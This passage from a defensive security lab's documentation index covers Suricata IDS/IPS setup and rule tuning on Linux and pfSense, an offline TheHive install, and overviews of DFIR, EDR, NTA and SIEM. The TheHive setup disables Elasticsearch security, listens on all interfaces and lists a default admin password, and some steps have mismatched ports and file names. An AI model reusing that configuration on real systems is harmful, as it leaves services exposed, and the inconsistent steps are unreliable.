--build-info\n</code></pre> <p>and make sure that <code>NFQueue support: yes</code> is listed in the output.</p> <p>Edit local.rules to add a sample rule for IPS mode:</p> <pre><code>sudo nano /usr/share/suricata/rules/local.rules\n</code></pre> <pre><code>#IDS Mode\nalert icmp any any -&gt; $HOME_NET any (msg: \"ICMP Ping Detected\"; sid:1; rev:1;)\n\n#IPS Mode\ndrop icmp any any -&gt; 1.1.1.1 any (msg:\"ICMP Detected and Blocked to 1.1.1.1\"; sid:2; rev:1;)\n</code></pre> <p>Run Suricata with the NFQ mode and use the\u00a0<code>-q</code>\u00a0option. This option tells Suricata which queue numbers it should use.</p> <pre><code>sudo suricata -c /etc/suricata/suricata.yaml -q 0\n</code></pre> <p>In this scenario, you are sending traffic that is generated by your computer to Suricata. Run:</p> <pre><code>sudo iptables -I INPUT -j NFQUEUE\nsudo iptables -I OUTPUT -j NFQUEUE\n</code></pre> <p>If Suricata is installed on the gateway (e.g. Firewall), you can send traffic that passes through Suricata by running:</p> <pre><code>sudo iptables -I FORWARD -j NFQUEUE\n</code></pre> <p>Execute <code>ping 1.1.1.1</code> and check Suricata alerts:</p> <pre><code>ping 1.1.1.1\ntail -f /var/log/suricata/fast.log\n</code></pre> <pre><code>09/14/2024-16:11:08.050136  [Drop] [**] [1:2:1] ICMP Detected and Blocked to 1.1.1.1 [**] [Classification: (null)] [Priority: 3] {ICMP} 10.0.0.27:8 -&gt; 1.1.1.1:0\n</code></pre> <p>To see if you have set your\u00a0<code>iptables</code>\u00a0rules correct make sure Suricata is running and enter:</p> <pre><code>sudo iptables -vnL\n</code></pre> <p>In the example you can see if packets are being logged.</p> <pre><code>Chain INPUT (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n 1032 1101K NFQUEUE    all  --  *      *       0.0.0.0/0            0.0.0.0/0            NFQUEUE num 0\n\nChain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n\nChain OUTPUT (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n 1469  126K NFQUEUE    all  --  *      *       0.0.0.0/0            0.0.0.0/0            NFQUEUE num 0\n</code></pre>"},{"location":"suricata/suricata.html#install-suricata-on-gateway","title":"Install Suricata on Gateway","text":"<p>While Suricata can be installed on a host, it can also be installed on a gateway such as pfSense. The pfSense\u00a0is a free and open source firewall and router. For installing and configuring pfSense, refer to pfSense documentation and instruction video. pfSense can be downloaded from here.</p> <p>Full demonstration video on configuring Suricata on pfSense can be found here. </p> <p>After competing basic configuration on pfSense, navigate to System &gt; Package Manager &gt; Available Packages on pfSense web UI.</p> <p>Search for <code>suricata</code> and click install (confirm when prompted). Internet connection is required.</p> <p></p> <p></p> <p>Once install is complete, navigate to Services &gt; Suricata &gt; Global Settings.</p> <p>Select Install ETOpen Emerging Threats rules, Install Feodo Tracker Botnet C2 IP rules and Install ABUSE.ch SSL Blacklist rules.</p> <p></p> <p>Select 1 Day for Update Interval and select Live Rule Swap on Update.</p> <p></p> <p>Leave rest of settings default and click save.</p> <p>Navigate to Update section and click Update.</p> <p></p> <p>Once rule set update is complete, you will see timestamps of recent update.</p> <p></p> <p>Navigate to Interfaces section and click Add.</p> <p></p> <p>Select interface to run Suricata. In this demonstration, Suricata is installed on the LAN interface.</p> <p></p> <p>For the EVE Output Settings, select EVE JSON Log and Output Type as FILE. Leave rest of the settings as default values and click Save.</p> <p></p> <p>Within the Interface section, navigate to LAN Categories and Select All rulesets and click Save.</p> <p>You can read about each rule in the LAN Rules section and enable certain rule instead of enabling all rules. Pointproof documentation explains about the emerging rules. </p> <p></p> <p>On pfSense VM, selection option 8 for shell and run <code>top -s 1</code> to monitor CPU</p> <pre><code>top -s 1\n</code></pre> <p></p> <p>Navigate back to Interfaces section and run Suricata by clicking the play button.</p> <p></p> <p>After a while, you will see a green tick box on Suricata Status, but CPU usage is still at 99%. Wait until CPU usage drops below 30% of pfSense VM CLI.</p> <p></p> <p>Navigate to the Alerts tab, and verify that there are no alerts.</p> <p></p>"},{"location":"suricata/suricata.html#testing-ids","title":"Testing IDS","text":"<p>Suricata by default generates alert when a user access .to domain. From the Windows host connected to pfSense on an internal network, navigate to https://amzn.to/3xPjJbS on a web browser.</p> <p>Note that the alerts have been generated but these are false positives.</p> <p></p>"},{"location":"suricata/suricata.html#finetuning-rules-to-reduce-false-positives","title":"Finetuning rules to reduce false positives","text":"<p>Copy GID:SID <code>1:2027757</code> . Navigate to SID Mgmt tab, select Enable Automatic SID State Management. Edit the disablesid-sample.conf</p> <p></p> <p>Edit the List Name as LAN-Disabled. Delete the existing content and copy and paste the following:</p> <pre><code>#ET DNS Query for .to TLD\n1:2027757\n</code></pre> <p></p> <p>Repeat the same process for dropsid-sample.conf and enablesid-sample.conf. Change the List Name of dropsid-sample.conf to LAN-Drops and enablesid-sample.conf to LAN-Enabled. Make sure they each have nothing in the content.</p> <p>For Interface SID Management List Assignments, select Rebuild. Select LAN-Enabled for Enable SID List, LAN-Disabled for Disable SID List.</p> <p></p> <p>Navigate back to Alerts tab and clear alerts</p> <p></p> <p>From the Windows host connected to pfSense on an internal network. Wait for CPU percentage to drop. Navigate to https://amzn.to/3xPjJbS on a web browser. Verify that alerts have not been generated.</p> <p></p> <p>Navigate to Interface Settings &gt; LAN Rules. Select emerging-dns.rules.</p> <p></p> <p>Search for <code>.to</code> . Verify that ET DNS Query for .to TLD is Auto-disabled by settings on SID Mgmt tab.</p> <p></p>"},{"location":"suricata/suricata.html#testing-ips","title":"Testing IPS","text":"<p>Disable Hardware Checksum Offloading. Navigate to System &gt; Advanced &gt; Networking.</p> <p>Select Disable hardware checksum offload and save. pfSense will reboot to apply changes.</p> <p></p> <p>Navigate to Suricata &gt; LAN Interface settings</p> <p>In the Alert and Block Settings, select Block Offenders and Inline mode for IPS mode.</p> <p></p> <p>Navigate to SID Mgmt and edit LAN-Drops. Copy and paste the following list:</p> <pre><code>emerging-3coresec\nemerging-ciarmy\nemerging-compromised\nemerging-current_events\nemerging-drop\nemerging-dshield\nemerging-dns\nemerging-botcc\nemerging-malware\nemerging-tor\nemerging-trojan\nemerging-scan\nfeodotracker\nsslblacklist_tls_cert\n</code></pre> <p></p> <p>For Interface SID Management List Assignments, select Rebuild and select LAN-Drops for Drop SID LIst. Click Save.</p> <p></p> <p>Navigate to Interface tab and restart Suricata</p> <p></p> <p>On Windows host, browse through <code>http://malware.wicar.org/</code>: This site hosts files and URLs that trigger IPS/IDS signatures without actually hosting real malware.</p> <p>Verify that the alerts have been generated.</p> <p></p> <p>Part of our LAN-Drops includes a rule that will drop a traffic when a user visits <code>.cc</code> TLD</p> <p>From Windows host, run <code>nslookup something.cc</code> </p> <pre><code>PS C:\\Users\\Administrator\\Downloads&gt; nslookup something.cc\nServer:  UnKnown\nAddress:  ::1\n\nDNS request timed out.\n    timeout was 2 seconds.\nDNS request timed out.\n    timeout was 2 seconds.\n*** Request to UnKnown timed-out\n</code></pre> <p>Alerts log shows that DNS query to .cc TLD has been dropped</p> <p></p>"},{"location":"suricata/suricata.html#references","title":"References","text":"<ul> <li>https://docs.suricata.io/en/latest/index.html</li> <li>https://documentation.wazuh.com/current/proof-of-concept-guide/integrate-network-ids-suricata.html</li> <li>https://youtu.be/UXKbh0jPPpg?si=9_Ry4dN7_X7HHpvH</li> <li>https://github.com/nn-df/suricata-installation-ips-mode</li> <li>https://tools.emergingthreats.net/docs/ETPro Rule Categories.pdf</li> </ul>"},{"location":"thehive/thehive.html","title":"TheHive","text":""},{"location":"thehive/thehive.html#thehive","title":"TheHive","text":"<p>TheHive is an open-source security incident response platform designed to help organisations efficiently manage and respond to cybersecurity incidents. Developed to facilitate collaboration among security teams, it provides a centralised system for tracking and investigating security events, alerts, and cases.</p>"},{"location":"thehive/thehive.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, TheHive was installed on an Ubuntu Virtual Machine (VM). </p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) hive Ubuntu 22.04 LTS TheHive VM 10.0.0.40 <p></p>"},{"location":"thehive/thehive.html#install-thehive-offline","title":"Install TheHive Offline","text":""},{"location":"thehive/thehive.html#download-the-dependencies","title":"Download the dependencies","text":"<p>On an internet-connected Ubuntu machine, make a folder called the hive-package</p> <pre><code>mkdir hive-package\ncd hive-package\n</code></pre> <p>Download openjdk 11</p> <pre><code>#wget http://archive.ubuntu.com/ubuntu/pool/main/o/openjdk-lts/openjdk-11-jdk_11.0.24+8-1ubuntu3~22.04_amd64.deb\n</code></pre> <p>Add the Cassandra, StrangeBee and Elasticsearch repositories and its GPG keys:</p> <pre><code>wget -qO - https://downloads.apache.org/cassandra/KEYS | sudo gpg --dearmor  -o /usr/share/keyrings/cassandra-archive.gpg\necho \"deb [signed-by=/usr/share/keyrings/cassandra-archive.gpg] https://debian.cassandra.apache.org 40x main\" | sudo tee -a /etc/apt/sources.list.d/cassandra.sources.list\nwget -O- https://archives.strangebee.com/keys/strangebee.gpg | sudo gpg --dearmor -o /usr/share/keyrings/strangebee-archive-keyring.gpg\necho 'deb [signed-by=/usr/share/keyrings/strangebee-archive-keyring.gpg] https://deb.strangebee.com thehive-5.2 main' | sudo tee -a /etc/apt/sources.list.d/strangebee.list\nwget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch |  sudo gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg\nsudo apt-get install apt-transport-https\necho \"deb [signed-by=/usr/share/keyrings/elasticsearch-keyring.gpg] https://artifacts.elastic.co/packages/8.x/apt stable main\" |  sudo tee /etc/apt/sources.list.d/elastic-8.x.list\n</code></pre> <p>Update and download the required packages without installing: This will download all packages into the cache <code>/var/cache/apt/archives/</code></p> <pre><code>sudo apt update\nsudo apt-get install -y --download-only cassandra\nsudo apt-get install -y --download-only thehive\nsudo apt-get install -y --download-only elasticsearch\n</code></pre> <p>Run the following command to copy the required files and dependencies to the <code>hive-package</code> </p> <pre><code>cd /var/cache/apt/archives\ncp openjdk-11-jre-headless_11.0.24+8-1ubuntu3~22.04_amd64.deb cassandra_4.0.13_all.deb java-common_0.72build2_all.deb ca-certificates-java_20190909ubuntu1.2_all.deb thehive_5.2.14-1_all.deb elasticsearch_8.15.1_amd64.deb ~/hive-package/\n</code></pre> <p>Compress the hive-package directory</p> <pre><code>cd ..\ntar -czvf hive-package.tar.gz hive-package\n</code></pre> <p>Transfer and extract the hive-package on the air-gapped machine</p> <p>Install the deb packages</p> <pre><code>tar -xzvf thehive_packages.tar.gz\nsudo dpkg -i *\n</code></pre>"},{"location":"thehive/thehive.html#configure-thehive","title":"Configure TheHive","text":"<p>Edit /etc/cassandra/cassandra.yaml</p> <p>Leave cluster names as \u2018Test Cluster\u2019</p> <p>Change the listen_address, rpc_address and the seeds to your IP address</p> <pre><code>cluster_name: 'Test Cluster'\n...\nlisten_address: 10.0.0.40\n...\nrpc_address: 10.0.0.40\n...\nseed_provider:\n    # Addresses of hosts that are deemed contact points. \n    # Cassandra nodes use this list of hosts to find each other and learn\n    # the topology of the ring.  You must change this if you are running\n    # multiple nodes!\n    - class_name: org.apache.cassandra.locator.SimpleSeedProvider\n      parameters:\n          # seeds is actually a comma-delimited list of addresses.\n          # Ex: \"&lt;ip1&gt;,&lt;ip2&gt;,&lt;ip3&gt;\"\n          - seeds: \"10.0.0.40:7000\"\n</code></pre> <p>Stop cassandra, remove the system keyspace data and then start cassandra. \\</p> <p>Verify that cassandra service is active and running.</p> <pre><code>systemctl stop cassandra\nrm -rf /var/lib/cassandra/data/system/*\nsystemctl start cassandra.service\nsystemctl status cassandra.service\n</code></pre> <p>Edit /etc/elasticsearch/elasticsearch.yml</p> <p>Uncomment the cluster name and change it to thehive</p> <p>Uncomment the node name and leave it as node-1</p> <p>Uncomment the network host and change it to your IP address</p> <p>Uncomment the http port: 92000</p> <p>Uncomment the cluster initial master nodes and remove node-2</p> <p>Comment the cluster initial master nodes \u201chive\u201d</p> <pre><code>cluster.name: thehive\n...\nnode.name: node-1\n...\nnetwork.host: 10.0.0.40\n...\nhttp.port: 9200\n...\ncluster.initial_master_nodes: [\"node-1\"]\n...\n# Enable security features\nxpack.security.enabled: false\nxpack.security.enrollment.enabled: false\n...\n#cluster.initial_master_nodes: [\"hive\"]\n</code></pre> <p>Start and enable elasticsearch. Verify elasticsearch service is active and running.</p> <pre><code>systemctl start elasticsearch\nsystemctl enable elasticsearch\nsystemctl status elasticsearch.service\n</code></pre> <p>Change the ownership of the /opt/thp directory to thehive user and group.</p> <p>Verify the ownership</p> <pre><code>chown -R thehive:thehive /opt/thp\n\nls -la /opt/thp\ntotal 12\ndrwxr-xr-x 3 thehive thehive 4096 Sep  7 17:12 .\ndrwxr-xr-x 4 root    root    4096 Sep  7 17:12 ..\ndrwxr-xr-x 5 thehive thehive 4096 Sep  7 17:12 thehive\n</code></pre> <p>Edit /etc/thehive/application.conf</p> <p>Change the host name and application baseURL to your IP address</p> <p>Make sure cluster-name matches with the cluster name defined in cassandra.yaml</p> <p>To ensure TheHive is listening on the correct IP address and port, add the following lines under the service configuration:</p> <pre><code>db.janusgraph {\n  storage {\n    backend = cql\n    hostname = [\"10.0.0.40\"]\n    # Cassandra authentication (if configured)\n    # username = \"thehive\"\n    # password = \"password\"\n    cql {\n      cluster-name = \"Test Cluster\"\n      keyspace = thehive\n    }\n  }\n  index.search {\n    backend = elasticsearch\n    hostname = [\"10.0.0.40\"]\n    index-name = thehive\n  }\n}\n...\n# Service configuration\napplication.baseUrl = \"http://10.0.0.40:9000\"\nplay.http.context = \"/\"\nplay {\n  http {\n    address = \"0.0.0.0\"  # Listen on all interfaces or set to \"10.0.0.40\" to bind to that IP\n    port = 9000\n  }\n}\n</code></pre> <p>Start and enable thehive service. Verify it is active and running.</p> <pre><code>systemctl start thehive\nsystemctl enable thehive\nsystemctl status thehive\n</code></pre> <p>Navigate to thehive dashboard http://10.0.0.40:9000</p> <p>Login using default credentials admin@hive.local (password: secret)</p> <p></p>"},{"location":"thehive/thehive.html#references","title":"References","text":"<ul> <li>https://github.com/MyDFIR/SOC-Automation-Project/blob/main/TheHive-Install-Instructions</li> <li>https://youtu.be/YxpUx0czgx4?si=-B57fRikVW8AVORo</li> <li>https://youtu.be/VuSKMPRXN1M?si=JctwPim-_c3ydR-E</li> </ul>"},{"location":"understanding-DFIR/understanding-DFIR.html","title":"Understanding DFIR","text":""},{"location":"understanding-DFIR/understanding-DFIR.html#understanding-dfir","title":"Understanding DFIR","text":""},{"location":"understanding-DFIR/understanding-DFIR.html#what-is-dfir","title":"What is DFIR?","text":"<p>Digital Forensics and Incident Response (DFIR) refers to the combined processes of gathering and analysing digital evidence to detect, investigate, and respond to cyber incidents.</p> <ul> <li>Digital Forensics: The process of identifying, collecting, preserving, and analysing evidence from digital devices.</li> <li>Incident Response: The structured approach to managing the aftermath of a security breach or attack, with the goal of limiting damage and reducing recovery time and costs.</li> </ul>"},{"location":"understanding-DFIR/understanding-DFIR.html#why-dfir-matters-to-us","title":"Why DFIR Matters to Us","text":"<ol> <li>Rapid Detection and Response<ul> <li>Early Threat Detection: Identifies potential threats before they can escalate into significant incidents.</li> <li>Efficient Incident Handling: Enables swift and structured response to mitigate damage.</li> </ul> </li> <li>Evidence Collection and Preservation<ul> <li>Forensic Analysis: Collects detailed evidence, ensuring it can be used to understand incidents or support legal investigations.</li> <li>Compliance: Helps meet regulatory requirements for incident reporting and evidence preservation.</li> </ul> </li> <li>Minimising Impact<ul> <li>Damage Control: Ensures that the impact of any incident is limited by taking rapid response measures.</li> <li>Recovery and Learning: Facilitates prompt system recovery and helps learn from incidents to improve defenses.</li> </ul> </li> <li>Improved Visibility and Monitoring<ul> <li>Comprehensive Analysis: Provides deep insights into endpoints and activities, ensuring comprehensive monitoring and forensic analysis.</li> </ul> </li> </ol>"},{"location":"understanding-DFIR/understanding-DFIR.html#benefits-of-implementing-dfir","title":"Benefits of Implementing DFIR","text":"<ul> <li>Proactive Threat Management: Identifies and responds to potential threats before they become major incidents.</li> <li>Streamlined Investigations: Enables effective evidence collection and forensic analysis.</li> <li>Operational Continuity: Minimises downtime by responding rapidly to incidents.</li> <li>Compliance Support: Ensures regulatory requirements for incident management and digital evidence are met.</li> <li>Cost Efficiency: Reduces the costs associated with long recovery times and system outages.</li> </ul>"},{"location":"understanding-DFIR/understanding-DFIR.html#dfir-solution","title":"DFIR Solution","text":""},{"location":"understanding-DFIR/understanding-DFIR.html#velociraptor","title":"Velociraptor","text":"<ul> <li>Endpoint Visibility and Control: Velociraptor provides deep visibility into endpoints, allowing us to hunt for indicators of compromise (IoCs) across the network.</li> <li>Flexible Querying: Utilises Velociraptor Query Language (VQL) to perform detailed investigations on endpoint activity.</li> <li>Rapid Data Collection: Gathers information quickly from multiple endpoints for analysis.</li> <li>Scalable and Extensible: Designed to scale across large environments, with community-contributed plugins and scripts to enhance capabilities.</li> </ul>"},{"location":"understanding-DFIR/understanding-DFIR.html#how-dfir-works","title":"How DFIR Works","text":"<ol> <li>Detection<ul> <li>Monitoring and Alerts: Detects suspicious activities and alerts the response team.</li> </ul> </li> <li>Investigation<ul> <li>Data Collection: Collects data from endpoints using Velociraptor or GRR for forensic analysis.</li> <li>Analysis: analyses the collected data to identify the root cause and understand the scope of the incident.</li> </ul> </li> <li>Containment and Eradication<ul> <li>Containment Measures: Limits the spread of an incident by isolating affected systems.</li> <li>Eradication: Removes the malicious artifacts from systems to prevent recurrence.</li> </ul> </li> <li>Recovery<ul> <li>Restoration: Restores systems to normal operation, ensuring no remnants of the threat remain.</li> </ul> </li> <li>Lessons Learned<ul> <li>Review: analyses what went wrong, what worked, and what can be improved in the incident response process.</li> </ul> </li> </ol>"},{"location":"understanding-EDR/understanding-EDR.html","title":"Understanding EDR","text":""},{"location":"understanding-EDR/understanding-EDR.html#understanding-edr","title":"Understanding EDR","text":""},{"location":"understanding-EDR/understanding-EDR.html#what-is-edr","title":"What is EDR?","text":"<p>Endpoint Detection and Response (EDR) is a cybersecurity technology that focuses on identifying, investigating, and responding to threats targeting endpoint devices such as laptops, desktops, and servers. EDR systems continuously monitor endpoint activity, detect suspicious behaviour, and provide tools for analysing and mitigating potential threats, ensuring endpoint devices remain secure.</p>"},{"location":"understanding-EDR/understanding-EDR.html#why-edr-matters-to-us","title":"Why EDR Matters to Us","text":"<ol> <li>Proactive Threat Detection<ul> <li>Advanced Visibility: Monitors endpoint activity to detect potential threats and vulnerabilities.</li> <li>Behavioural Analysis: Identifies patterns of malicious behaviour that may evade traditional antivirus solutions.</li> </ul> </li> <li>Incident Response<ul> <li>Quick Containment: EDR enables the isolation of compromised endpoints to prevent further spread.</li> <li>In-Depth Investigation: Offers detailed tools for understanding the scope and root cause of incidents.</li> </ul> </li> <li>Enhanced Endpoint Security<ul> <li>Zero-Day Protection: Detects and blocks threats from unknown vulnerabilities through behaviour-based analysis.</li> <li>Continuous Monitoring: Provides real-time protection against evolving threats.</li> </ul> </li> </ol>"},{"location":"understanding-EDR/understanding-EDR.html#benefits-of-implementing-edr","title":"Benefits of Implementing EDR","text":"<ul> <li>Rapid Response: Neutralises threats quickly to minimise impact.</li> <li>Comprehensive Visibility: Provides a clear understanding of endpoint activities.</li> <li>Reduced Downtime: Minimises operational disruptions caused by incidents.</li> <li>Improved Resilience: Enhances the ability to prevent, detect, and recover from cyberattacks.</li> </ul>"},{"location":"understanding-EDR/understanding-EDR.html#how-edr-works","title":"How EDR Works","text":"<ol> <li>Data Collection: Gathers and stores activity data from endpoint devices, including processes, files, and network connections.</li> <li>Threat Detection: Uses AI, machine learning, and behavioural analytics to identify potential security threats in real time.</li> <li>Investigation: Provides forensic tools to analyse the nature, scope, and impact of detected incidents.</li> <li>Response: Enables automated and manual actions, such as isolating endpoints, terminating malicious processes, and restoring affected systems.</li> </ol>"},{"location":"understanding-EDR/understanding-EDR.html#edr-solution","title":"EDR Solution","text":"<ul> <li>Aurora Lite is an efficient and lightweight EDR solution tailored to provide robust protection for endpoint devices without overwhelming system resources. Its key features include:<ul> <li>Sigma Rules Integration: Detects threats by applying Sigma rules, a widely recognised standard for creating and sharing detection rules.</li> <li>Customisable Signatures and IOCs: Allows flexibility to adapt detection capabilities to meet specific security needs.</li> <li>Automated Response: Includes preconfigured actions to immediately contain and mitigate threats.</li> <li>Ease of Deployment: Simplifies the installation process for fast implementation across endpoints.</li> <li>Low Resource Usage: Optimised to run efficiently without impacting device performance.</li> </ul> </li> </ul>"},{"location":"understanding-IDS-IPS/understanding-IDS-IPS.html","title":"Understanding IDS/IPS","text":""},{"location":"understanding-IDS-IPS/understanding-IDS-IPS.html#understanding-idsips","title":"Understanding IDS/IPS","text":""},{"location":"understanding-IDS-IPS/understanding-IDS-IPS.html#what-are-ids-and-ips","title":"What are IDS and IPS?","text":"<p>Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) are cybersecurity technologies designed to monitor network traffic for signs of malicious activity.</p> <ul> <li>IDS: Monitors network traffic and alerts security teams when suspicious activities are detected.</li> <li>IPS: Not only detects suspicious activities but also takes action to prevent potential threats from causing harm.</li> </ul>"},{"location":"understanding-IDS-IPS/understanding-IDS-IPS.html#why-idsips-matter-to-us","title":"Why IDS/IPS Matter to Us","text":"<ol> <li>Proactive Threat Detection<ul> <li>Early Warning: IDS alerts us to potential security threats before they become serious issues.</li> <li>Immediate Action: IPS can block malicious traffic in real-time, preventing attacks.</li> </ul> </li> <li>Real-Time Monitoring<ul> <li>Continuous Surveillance: Keeps an eye on network activity around the clock.</li> <li>Swift Response: Enables quick action to mitigate threats as they arise.</li> </ul> </li> <li>Regulatory Compliance<ul> <li>Meeting Standards: Helps us comply with cybersecurity regulations and industry best practices.</li> <li>Audit Trails: Provides detailed logs required for compliance reporting.</li> </ul> </li> <li>Risk Mitigation<ul> <li>Reducing Breaches: Helps prevent security incidents that could harm our operations and reputation.</li> <li>Strategic Planning: Informs decisions on improving our cybersecurity measures.</li> </ul> </li> </ol>"},{"location":"understanding-IDS-IPS/understanding-IDS-IPS.html#benefits-of-implementing-idsips","title":"Benefits of Implementing IDS/IPS","text":"<ul> <li>Enhanced Security: Strengthens our defenses against cyber attacks.</li> <li>Operational Efficiency: Automates threat detection and prevention, reducing manual efforts.</li> <li>Stakeholder Confidence: Shows our commitment to security, building trust with clients and partners.</li> <li>Cost Savings: Prevents costly security breaches and downtime.</li> </ul>"},{"location":"understanding-IDS-IPS/understanding-IDS-IPS.html#how-idsips-work","title":"How IDS/IPS Work","text":"<ol> <li>Traffic Monitoring: Continuously scans network traffic for unusual patterns or known threat signatures.</li> <li>Analysis: Uses rules and algorithms to detect potential threats based on predefined criteria.</li> <li>Alerting (IDS): Sends notifications to the security team when suspicious activity is detected.</li> <li>Prevention (IPS): Automatically blocks or quarantines malicious traffic to prevent damage.</li> </ol>"},{"location":"understanding-IDS-IPS/understanding-IDS-IPS.html#idsips-solutions","title":"IDS/IPS Solutions","text":"<ul> <li>Snort<ul> <li>Open-Source IDS/IPS: Widely used for real-time traffic analysis and packet logging.</li> <li>Customisation: Allows us to tailor rules to our specific network environment.</li> <li>Community Support: Extensive community and a large repository of rules for threat detection.</li> </ul> </li> <li>Suricata<ul> <li>Open-Source IDS/IPS: Provides robust intrusion detection and prevention capabilities.</li> <li>Protocol Detection: Automatically detects and parses various protocols such as HTTP for deeper inspection.</li> <li>Integration Capabilities: Easily integrates with other security tools and platforms, enhancing overall security infrastructure.</li> </ul> </li> </ul>"},{"location":"understanding-NTA/understanding-NTA.html","title":"Understanding NTA","text":""},{"location":"understanding-NTA/understanding-NTA.html#understanding-nta","title":"Understanding NTA","text":""},{"location":"understanding-NTA/understanding-NTA.html#what-is-nta","title":"What is NTA?","text":"<p>Network Traffic Analysis (NTA) involves examining network traffic patterns to detect anomalies, understand usage, and identify potential threats. A Network Traffic Analyser is a tool that monitors, captures, and analyses network data to provide insights into network performance and security.</p>"},{"location":"understanding-NTA/understanding-NTA.html#why-nta-matters-to-us","title":"Why NTA Matters to Us","text":"<ol> <li>Enhanced Visibility<ul> <li>Comprehensive Monitoring: Provides a detailed view of all activities on our network.</li> <li>Anomaly Detection: Identifies unusual patterns that may indicate security threats or performance issues.</li> </ul> </li> <li>Improved Security<ul> <li>Threat Detection: Helps in identifying malicious activities such as malware, unauthorised access, or data exfiltration.</li> <li>Incident Response: Aids in investigating and responding to security incidents promptly.</li> </ul> </li> <li>Performance Optimisation<ul> <li>Resource Management: Monitors bandwidth usage to optimise network performance.</li> <li>Troubleshooting: Assists in quickly identifying and resolving network issues affecting productivity.</li> </ul> </li> <li>Regulatory Compliance<ul> <li>Audit Trails: Maintains detailed logs required for compliance with industry regulations.</li> <li>Policy Enforcement: Ensures adherence to organisational network usage policies.</li> </ul> </li> </ol>"},{"location":"understanding-NTA/understanding-NTA.html#benefits-of-implementing-nta","title":"Benefits of Implementing NTA","text":"<ul> <li>Proactive Threat Management: Early detection of security threats before they escalate.</li> <li>Operational Efficiency: Reduces downtime by swiftly addressing network issues.</li> <li>Cost Savings: Optimises resource utilisation, reducing unnecessary expenses.</li> <li>Informed Decision-Making: Provides data-driven insights for strategic planning and policy development.</li> <li>Stakeholder Confidence: Demonstrates our commitment to maintaining a secure and efficient network environment.</li> </ul>"},{"location":"understanding-NTA/understanding-NTA.html#how-nta-works","title":"How NTA Works","text":"<ol> <li>Data Capture<ul> <li>Continuously collects network packets and flow data in real-time.</li> </ul> </li> <li>Data Processing<ul> <li>Analyses the captured data to identify patterns, anomalies, and trends.</li> </ul> </li> <li>Alerting and Reporting<ul> <li>Generates alerts for suspicious activities and comprehensive reports on network performance.</li> </ul> </li> <li>Actionable Insights<ul> <li>Provides recommendations for enhancing network security and efficiency.</li> </ul> </li> </ol>"},{"location":"understanding-NTA/understanding-NTA.html#nta-solutions","title":"NTA Solutions","text":""},{"location":"understanding-NTA/understanding-NTA.html#wireshark","title":"Wireshark","text":"<ul> <li>Comprehensive Network Protocol Analyser: Wireshark is a widely-used open-source tool for network troubleshooting, analysis, and education.</li> <li>Deep Inspection: Captures live network traffic and allows detailed examination of hundreds of protocols.</li> <li>User-Friendly Interface: Provides a graphical interface with powerful filtering capabilities for easy analysis.</li> <li>Cross-Platform Support: Available on multiple operating systems including Windows, macOS, and Linux.</li> <li>Educational Resource: Great for learning about network protocols and how data traverses the network.</li> </ul> <p>Note: Wireshark proof of concept and documentation will be released later. We will provide more information on this tool once it is available.</p>"},{"location":"understanding-NTA/understanding-NTA.html#zeek","title":"Zeek","text":"<ul> <li>Powerful Network Analysis Framework: Zeek (formerly known as Bro) is an open-source platform that offers deep network traffic analysis.</li> <li>Security Monitoring: Detects a wide range of malicious activities by analysing network protocols and behaviours.</li> <li>Flexibility and Extensibility: Features a powerful scripting language for custom policy creation and event handling.</li> <li>Integration Capabilities: Easily integrates with other security tools, enhancing our overall cybersecurity infrastructure.</li> <li>Community Support: Backed by an active community contributing scripts, plugins, and support.</li> </ul>"},{"location":"understanding-NTA/understanding-NTA.html#zui","title":"Zui","text":"<ul> <li>Enhanced PCAP Viewer: Zui is a modern network analysis tool designed to simplify the analysis of pcap files and Zeek logs.</li> <li>Improved Readability: Offers a clear and intuitive interface that makes complex network data more accessible.</li> <li>Fast Search Capabilities: Allows quick searching through large datasets, facilitating efficient investigation of network events.</li> <li>Collaborative Analysis: Supports workflows where multiple users can analyse the same network data, promoting teamwork in incident response and forensic analysis.</li> <li>Seamless Integration: Works effectively with both Zeek and Wireshark, complementing their deep network inspection capabilities with user-friendly data presentation.</li> </ul>"},{"location":"understanding-SIEM/understanding-SIEM.html","title":"Understanding SIEM","text":""},{"location":"understanding-SIEM/understanding-SIEM.html#understanding-siem","title":"Understanding SIEM","text":""},{"location":"understanding-SIEM/understanding-SIEM.html#what-is-siem","title":"What is SIEM?","text":"<p>Security Information and Event Management (SIEM) is a technology that provides real-time analysis of security alerts generated by applications and network hardware. SIEM systems collect and analyse security events from various sources within the IT infrastructure to detect anomalies, threats, and compliance issues, giving a centralised view of the organisation's security posture.</p>"},{"location":"understanding-SIEM/understanding-SIEM.html#why-siem-matters-to-us","title":"Why SIEM Matters to Us","text":"<ol> <li>Proactive Threat Detection<ul> <li>Early Identification: SIEM enables us to detect potential security incidents before they escalate.</li> <li>Real-Time Monitoring: Continuous surveillance helps us respond swiftly to threats.</li> </ul> </li> <li>Regulatory Compliance<ul> <li>Meeting Standards: SIEM assists in complying with military cybersecurity standards and other regulations.</li> <li>Audit Trails: Maintains comprehensive logs necessary for audits and compliance reporting.</li> </ul> </li> <li>Risk Mitigation<ul> <li>Reducing Breaches: Consolidated security events help prevent breaches that could harm operations and reputation.</li> <li>Strategic Decision-Making: Provides insights to inform cybersecurity investments and policies.</li> </ul> </li> </ol>"},{"location":"understanding-SIEM/understanding-SIEM.html#benefits-of-implementing-siem","title":"Benefits of Implementing SIEM","text":"<ul> <li>Enhanced Security: Strengthens defenses against sophisticated cyber threats.</li> <li>Operational Efficiency: Automates security monitoring, reducing manual efforts.</li> <li>Stakeholder Confidence: Demonstrates a commitment to security, bolstering trust.</li> <li>Cost Savings: Prevents costly breaches and downtime, safeguarding financial resources.</li> </ul>"},{"location":"understanding-SIEM/understanding-SIEM.html#how-siem-works","title":"How SIEM Works","text":"<ol> <li>Data Collection: Aggregates logs and events from servers, network devices, applications, and security tools.</li> <li>Normalisation: Converts data into a consistent format for easier analysis.</li> <li>Correlation: Uses rules and algorithms to link related events and identify patterns indicative of security incidents.</li> <li>Alerting and Reporting: Generates real-time alerts and comprehensive reports for security teams.</li> 